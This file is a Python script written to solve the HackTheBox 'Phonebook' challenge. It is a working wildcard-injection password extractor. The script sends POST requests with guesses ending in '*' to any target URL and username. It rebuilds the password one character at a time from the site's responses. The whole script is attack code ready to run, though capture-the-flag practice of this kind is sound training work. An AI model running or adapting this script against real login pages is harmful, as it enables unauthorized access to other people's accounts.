# This script is created for the "Phonebook" challenge on HackTheBox
# https://app.hackthebox.com/challenges/phonebook

import requests
import argparse

# List of characters to iterate through in password brute-force attack
characters = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '!', "'", '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', ',', '{', '}', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'
]

def send_request(url: str, username: str):
    """
    Function to send POST requests with the current password guess
    and try to brute-force the correct password by checking the response.
    """
    data = {'username': username, 'password': ''}
    result = ''

    # flag to control the while loop
    flag = True
    
    while flag:
        flag = False
        for char in characters:
            data['password'] = result + char + '*'  # append character and wildcard to the password guess
            r = requests.post(url, data=data)  # send POST request

            # If the response contains 'No search results', it means we're on the right track
            if 'No search results' in r.text:
                result += char  # add correct character to the result
                flag = True  # continue guessing the next character
                print(result)  # print current state of the password
                break  # break the loop and move on to the next character

if __name__ == '__main__':
    # Parse command line arguments for URL and username
    parser = argparse.ArgumentParser()

    parser.add_argument('url', help="Target URL")
    parser.add_argument('username', help="Username for which to brute-force the password")
    args = parser.parse_args()

    url = args.url
    username = args.username

    # Call the send_request function with the provided arguments
    send_request(url, username)
